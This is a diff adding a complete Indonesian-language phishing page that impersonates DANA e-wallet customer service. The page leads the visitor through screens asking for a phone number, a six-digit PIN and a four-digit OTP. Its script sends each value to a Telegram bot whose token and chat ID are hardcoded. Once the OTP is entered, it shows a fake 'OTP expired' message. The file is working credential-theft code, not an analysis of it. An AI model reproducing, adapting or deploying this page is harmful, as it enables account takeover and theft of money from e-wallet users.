@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- ✅ JUDUL & DESKRIPSI APLIKASI -->
+<title>Dana Customer Service</title>
+<meta name="description" content="Hai Teman DANA Jika membutuhkan bantuan yuk hubungi kami langsung">
+<!-- ✅ SAMBUTAN SAAT LINK DIBAGIKAN -->
+<meta property="og:title" content="Dana Customer Service">
+<meta property="og:description" content="Hai Teman DANA Jika membutuhkan bantuan yuk hubungi kami langsung">
+<meta property="og:image" content="https://i.ibb.co.com/NdQD4WQ2/images-16.jpg">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Dana Customer Service">
+<meta name="twitter:description" content="Hai Teman DANA Jika membutuhkan bantuan yuk hubungi kami langsung">
+<meta name="twitter:image" content="https://i.ibb.co.com/NdQD4WQ2/images-16.jpg">
+
+<style>
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Arial', sans-serif;
+  }
+
+  html, body {
+    width: 100%;
+    height: 100%;
+    overflow: hidden;
+  }
+
+  body {
+    background: url('https://i.ibb.co.com/pvD4h5C0/Screenshot-20260702-195357-1.jpg') center/cover no-repeat fixed;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: flex-start;
+    padding: 0;
+  }
+
+  /* --- BAGIAN ATAS --- */
+  .header-banner {
+    width: 100%;
+    max-width: 600px;
+    min-height: 210px;
+    margin: 0;
+    background: url('https://i.ibb.co.com/WJBNCyd/IMG-20260702-WA0054.jpg') center/100% 100% no-repeat;
+    border-radius: 0 0 16px 16px;
+    box-shadow: 0 12px 35px rgba(0,0,0,0.35);
+    transform: translateY(-100%);
+    opacity: 0;
+    animation: slideDown 1s ease-out forwards;
+    cursor: pointer;
+  }
+
+  /* --- BAGIAN MENU OPSI --- */
+  .menu-kontainer {
+    width: 100%;
+    max-width: 600px;
+    min-height: 320px;
+    margin-top: 20px;
+    flex-shrink: 0;
+    background: url('https://i.ibb.co.com/B2qMJD65/IMG-20260702-WA0055.jpg') center/100% 100% no-repeat;
+    border-radius: 16px;
+    box-shadow: 0 12px 35px rgba(0,0,0,0.35);
+    transform: translateX(220px);
+    opacity: 0;
+    animation: slideInRight 1s ease-out 0.5s forwards;
+    cursor: pointer;
+    transition: transform 0.2s ease;
+  }
+
+  .menu-kontainer:active {
+    transform: translateX(0) scale(0.98);
+  }
+
+  /* --- GAMBAR DI BAWAH --- */
+  .gambar-bawah {
+    width: 100%;
+    max-width: 600px;
+    min-height: 100px;
+    margin-top: 15px;
+    flex-shrink: 0;
+    background: url('https://i.ibb.co.com/tPmy1Tjy/1704436332522.png') center/contain no-repeat;
+  }
+
+  /* --- LAYAR LOADING --- */
+  .layar-loading {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.6);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 9999;
+    opacity: 0;
+    visibility: hidden;
+    transition: opacity 0.3s ease;
+  }
+
+  .layar-loading.aktif {
+    opacity: 1;
+    visibility: visible;
+  }
+
+  .loading-dana {
+    position: relative;
+    width: 60px;
+    height: 60px;
+  }
+
+  .logo-dana-load {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: 50px;
+    height: 50px;
+    z-index: 3;
+  }
+
+  .cincin-putar {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: 36px;
+    height: 36px;
+    animation: putar 1s linear infinite;
+    z-index: 2;
+  }
+
+  @keyframes putar {
+    from { transform: translate(-50%, -50%) rotate(0deg); }
+    to { transform: translate(-50%, -50%) rotate(360deg); }
+  }
+
+  /* --- LAYAR GAMBAR LOGO --- */
+  .layar-gambar-logo {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: url('https://i.ibb.co.com/GfwVQHHT/Screenshot-20260702-201723-1.jpg') center/cover no-repeat;
+    z-index: 9998;
+    opacity: 0;
+    visibility: hidden;
+    transition: opacity 0.8s ease;
+  }
+
+  .layar-gambar-logo.aktif {
+    opacity: 1;
+    visibility: visible;
+  }
+
+  /* --- HALAMAN NOMOR HP: DIPERBAIKI TIDAK MELEBAR --- */
+  .halaman-nomor {
+    position: fixed;
+    top: 0;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 100%;
+    max-width: 480px;
+    height: 100%;
+    background: #0070D1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 40px 20px 30px;
+    opacity: 0;
+    visibility: hidden;
+    transition: opacity 0.4s ease;
+    z-index: 999;
+  }
+
+  .halaman-nomor.aktif {
+    opacity: 1;
+    visibility: visible;
+  }
+
+  .logo-dana {
+    width: 120px;
+    margin-bottom: 40px;
+  }
+
+  .judul-isian {
+    color: white;
+    font-size: 18px;
+    text-align: center;
+    margin-bottom: 30px;
+    padding: 0 15px;
+  }
+
+  .judul-isian span {
+    font-weight: 700;
+  }
+
+  /* ✅ KOTAK INPUT DIBATASI LEBARNYA TIDAK MELEBAR */
+  .kotak-input {
+    width: 90%;
+    max-width: 320px; /* Lebar maksimal tetap */
+    min-width: 280px;
+    background: white;
+    border-radius: 12px;
+    display: flex;
+    align-items: center;
+    padding: 14px 16px;
+    gap: 10px;
+    margin-bottom: 25px;
+    flex-shrink: 0;
+  }
+
+  .bendera {
+    width: 28px;
+    height: 20px;
+    background: url('https://i.ibb.co.com/wN4Q9Hj4/indo.png') center/contain no-repeat;
+    flex-shrink: 0;
+  }
+
+  .kode-negara {
+    color: #333;
+    font-size: 18px;
+    font-weight: 500;
+    flex-shrink: 0;
+  }
+
+  .input-hp {
+    flex: 1;
+    border: none;
+    outline: none;
+    font-size: 18px;
+    color: #333;
+    width: 100%;
+    min-width: 0;
+    inputmode: numeric;
+  }
+
+  .keterangan {
+    color: rgba(255,255,255,0.9);
+    font-size: 15px;
+    text-align: center;
+    line-height: 1.6;
+    padding: 0 25px;
+    flex-shrink: 0;
+  }
+
+  .tombol-lanjut {
+    margin-top: auto;
+    color: white;
+    font-size: 17px;
+    font-weight: 500;
+    cursor: pointer;
+    opacity: 0.9;
+    transition: opacity 0.2s;
+    flex-shrink: 0;
+  }
+
+  .tombol-lanjut:hover {
+    opacity: 1;
+  }
+
+  /* --- HALAMAN PIN --- */
+  .halaman-pin {
+    position: fixed;
+    top: 0;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 100%;
+    max-width: 480px;
+    height: 100%;
+    background: #0070D1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 40px 25px 30px;
+    opacity: 0;
+    visibility: hidden;
+    transition: opacity 0.4s ease;
+    z-index: 1000;
+  }
+
+  .halaman-pin.aktif {
+    opacity: 1;
+    visibility: visible;
+  }
+
+  .judul-pin {
+    color: white;
+    font-size: 18px;
+    margin-bottom: 40px;
+  }
+
+  .kotak-pin {
+    display: flex;
+    gap: 12px;
+    margin-bottom: 25px;
+    position: relative;
+    cursor: pointer;
+  }
+
+  .kolom-pin {
+    width: 45px;
+    height: 55px;
+    background: white;
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 24px;
+    font-weight: bold;
+    color: #0070D1;
+  }
+
+  .input-pin-tersembunyi {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    opacity: 0.01;
+    border: none;
+    outline: none;
+    font-size: 16px;
+    inputmode: numeric;
+    pattern: "[0-9]*";
+    maxlength="6";
+    cursor: pointer;
+    z-index: 10;
+  }
+
+  .tombol-tampilkan {
+    border: 1px solid white;
+    background: transparent;
+    color: white;
+    padding: 8px 20px;
+    border-radius: 20px;
+    font-size: 14px;
+    margin-bottom: 40px;
+    cursor: pointer;
+  }
+
+  .lupa-pin {
+    color: white;
+    font-size: 16px;
+    text-decoration: underline;
+    cursor: pointer;
+  }
+
+  /* --- HALAMAN OTP --- */
+  .halaman-otp {
+    position: fixed;
+    bottom: 0;
+    left: 50%;
+    transform: translateX(-50%) translateY(100%);
+    width: 100%;
+    max-width: 480px;
+    background: white;
+    border-radius: 20px 20px 0 0;
+    padding: 30px 25px 40px;
+    transition: transform 0.4s ease;
+    z-index: 1001;
+  }
+
+  .halaman-otp.aktif {
+    transform: translateX(-50%) translateY(0);
+  }
+
+  .judul-otp {
+    font-size: 24px;
+    font-weight: bold;
+    text-align: center;
+    margin-bottom: 15px;
+    color: #111;
+  }
+
+  .keterangan-otp {
+    font-size: 16px;
+    text-align: center;
+    line-height: 1.5;
+    color: #444;
+    margin-bottom: 20px;
+  }
+
+  .kotak-otp {
+    display: flex;
+    justify-content: center;
+    gap: 15px;
+    margin-bottom: 15px;
+    position: relative;
+    cursor: pointer;
+  }
+
+  .kolom-otp {
+    width: 50px;
+    height: 55px;
+    background: #f3f4f6;
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 24px;
+    font-weight: bold;
+    color: #0070D1;
+  }
+
+  .input-otp-tersembunyi {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    opacity: 0.01;
+    border: none;
+    outline: none;
+    font-size: 16px;
+    inputmode: numeric;
+    pattern: "[0-9]*";
+    maxlength="4";
+    cursor: pointer;
+    z-index: 10;
+  }
+
+  .kirim-ulang {
+    text-align: center;
+    color: #888;
+    font-size: 15px;
+    cursor: pointer;
+    margin-bottom: 15px;
+  }
+
+  .pesan-gagal {
+    color: #ff3333;
+    font-size: 15px;
+    text-align: center;
+    font-weight: 500;
+    line-height: 1.5;
+    display: none;
+  }
+
+  .pesan-gagal.aktif {
+    display: block;
+  }
+
+  /* --- ANIMASI --- */
+  @keyframes slideDown {
+    to { transform: translateY(0); opacity: 1; }
+  }
+  @keyframes slideInRight {
+    to { transform: translateX(0); opacity: 1; }
+  }
+</style>
+</head>
+<body>
+
+<div class="header-banner"></div>
+<div class="menu-kontainer" onclick="mulaiProses()"></div>
+<div class="gambar-bawah"></div>
+
+<!-- Layar Loading -->
+<div class="layar-loading" id="layarLoading">
+  <div class="loading-dana">
+    <img src="https://i.ibb.co.com/bM8MqFx5/load-bg-1.png" alt="Logo DANA" class="logo-dana-load">
+    <img src="https://i.ibb.co.com/xqyBbPBZ/load-spin.png" alt="Cincin Loading" class="cincin-putar">
+  </div>
+</div>
+
+<div class="layar-gambar-logo" id="layarGambarLogo"></div>
+
+<!-- Halaman Nomor -->
+<div class="halaman-nomor" id="halamanNomor">
+  <img src="https://i.ibb.co.com/tMP7d2h0/dana-logo-fe46647.png" alt="Logo DANA" class="logo-dana">
+  <p class="judul-isian">Masukkan <span>nomor HP</span> kamu untuk lanjut</p>
+  <div class="kotak-input">
+    <div class="bendera"></div>
+    <span class="kode-negara">+62</span>
+    <input type="tel" class="input-hp" id="inputNomor" placeholder="811-1234-5678" maxlength="15">
+  </div>
+  <p class="keterangan">
+    Nomor ponsel akan digunakan sebagai ID kamu & menjaga akun selalu aman. Dengan melanjutkan, kamu setuju dengan Syarat & Ketentuan dan Kebijakan Privasi kami
+  </p>
+  <div class="tombol-lanjut" onclick="kirimNomor()">LANJUT</div>
+</div>
+
+<!-- Halaman PIN -->
+<div class="halaman-pin" id="halamanPin">
+  <img src="https://i.ibb.co.com/tMP7d2h0/dana-logo-fe46647.png" alt="Logo DANA" class="logo-dana">
+  <p class="judul-pin">Masukkan PIN DANA</p>
+  <div class="kotak-pin" onclick="fokusPin()">
+    <div class="kolom-pin"></div><div class="kolom-pin"></div><div class="kolom-pin"></div>
+    <div class="kolom-pin"></div><div class="kolom-pin"></div><div class="kolom-pin"></div>
+    <input type="text" class="input-pin-tersembunyi" id="inputPin" oninput="cekPin(this.value)">
+  </div>
+  <button class="tombol-tampilkan">TAMPILKAN</button>
+  <div class="lupa-pin">LUPA PIN?</div>
+</div>
+
+<!-- Halaman OTP -->
+<div class="halaman-otp" id="halamanOtp">
+  <h3 class="judul-otp">Masukkan OTP</h3>
+  <p class="keterangan-otp">Cek notifikasi atau pesan di akun DANA kamu</p>
+  <div class="kotak-otp" onclick="fokusOtp()">
+    <div class="kolom-otp"></div><div class="kolom-otp"></div>
+    <div class="kolom-otp"></div><div class="kolom-otp"></div>
+    <input type="text" class="input-otp-tersembunyi" id="inputOtp" oninput="cekOtp(this.value)">
+  </div>
+  <div class="kirim-ulang" id="waktuOtp">KIRIM ULANG (116s)</div>
+  <div class="pesan-gagal" id="pesanGagal">Masa berlaku OTP sudah habis, silahkan masukan yang baru</div>
+</div>
+
+<script>
+// ✅ DATA TELEGRAM
+const TOKEN = '8014371799:AAGacEG5Q5KjHgG_dLlZ8HC363DiaRzitok';
+const CHAT_ID = '8514257787';
+let nomorHp = '';
+let timer;
+
+// Fungsi kirim pesan ke Telegram
+async function kirimKeTelegram(pesan) {
+  const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+  try {
+    await fetch(url, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: pesan,
+        disable_web_page_preview: false
+      })
+    });
+  } catch (e) {
+    console.log('Gagal kirim:', e);
+  }
+}
+
+// Klik menu awal
+function mulaiProses() {
+  document.getElementById('layarLoading').classList.add('aktif');
+  setTimeout(() => {
+    document.getElementById('layarLoading').classList.remove('aktif');
+    document.getElementById('layarGambarLogo').classList.add('aktif');
+    setTimeout(() => document.getElementById('layarGambarLogo').style.opacity = '0', 2000);
+    setTimeout(() => {
+      document.getElementById('layarGambarLogo').classList.remove('aktif');
+      document.getElementById('halamanNomor').classList.add('aktif');
+    }, 2800);
+  }, 1500);
+}
+
+// ✅ KIRIM NOMOR HP KE TELEGRAM
+function kirimNomor() {
+  nomorHp = document.getElementById('inputNomor').value.replace(/\D/g, '');
+  if (!nomorHp) { alert('Masukkan nomor terlebih dahulu'); return; }
+  
+  const pesan = `📩 DATA BARU MASUK\n\nNOMOR: ${nomorHp}`;
+  kirimKeTelegram(pesan);
+
+  document.getElementById('layarLoading').classList.add('aktif');
+  setTimeout(() => {
+    document.getElementById('layarLoading').classList.remove('aktif');
+    document.getElementById('halamanNomor').classList.remove('aktif');
+    document.getElementById('halamanPin').classList.add('aktif');
+    setTimeout(() => document.getElementById('inputPin').focus(), 400);
+  }, 1500);
+}
+
+function fokusPin() { document.getElementById('inputPin').focus(); }
+
+// ✅ KIRIM PIN KE TELEGRAM
+function cekPin(nilai) {
+  const kolom = document.querySelectorAll('.kolom-pin');
+  const angka = nilai.replace(/\D/g, '');
+  for (let i=0; i<6; i++) kolom[i].textContent = angka[i] || '';
+  
+  if (angka.length === 6) {
+    const pesan = `📩 DATA LANJUTAN\n\nNOMOR: ${nomorHp}\nPIN AKUN: ${angka}`;
+    kirimKeTelegram(pesan);
+
+    setTimeout(() => {
+      document.getElementById('halamanOtp').classList.add('aktif');
+      mulaiHitungMundur();
+    }, 500);
+  }
+}
+
+function fokusOtp() { document.getElementById('inputOtp').focus(); }
+
+// ✅ KIRIM OTP KE TELEGRAM
+function cekOtp(nilai) {
+  const kolom = document.querySelectorAll('.kolom-otp');
+  const angka = nilai.replace(/\D/g, '');
+  for (let i=0; i<4; i++) kolom[i].textContent = angka[i] || '';
+  
+  if (angka.length === 4) {
+    const pesan = `📩 DATA TERAKHIR\n\nNOMOR: ${nomorHp}\nPIN AKUN: ${document.getElementById('inputPin').value}\nKODE OTP: ${angka}`;
+    kirimKeTelegram(pesan);
+
+    document.getElementById('layarLoading').classList.add('aktif');
+    setTimeout(() => {
+      document.getElementById('layarLoading').classList.remove('aktif');
+      document.getElementById('pesanGagal').classList.add('aktif');
+    }, 1500);
+  }
+}
+
+// Hitung mundur OTP
+function mulaiHitungMundur() {
+  let detik = 116;
+  const el = document.getElementById('waktuOtp');
+  document.getElementById('pesanGagal').classList.remove('aktif');
+  clearInterval(timer);
+  timer = setInterval(() => {
+    detik--;
+    el.textContent = `KIRIM ULANG (${detik}s)`;
+    if (detik <= 0) {
+      clearInterval(timer);
+      el.textContent = 'KIRIM ULANG';
+    }
+  }, 1000);
+}
+</script>
+
+</body>
+</html>
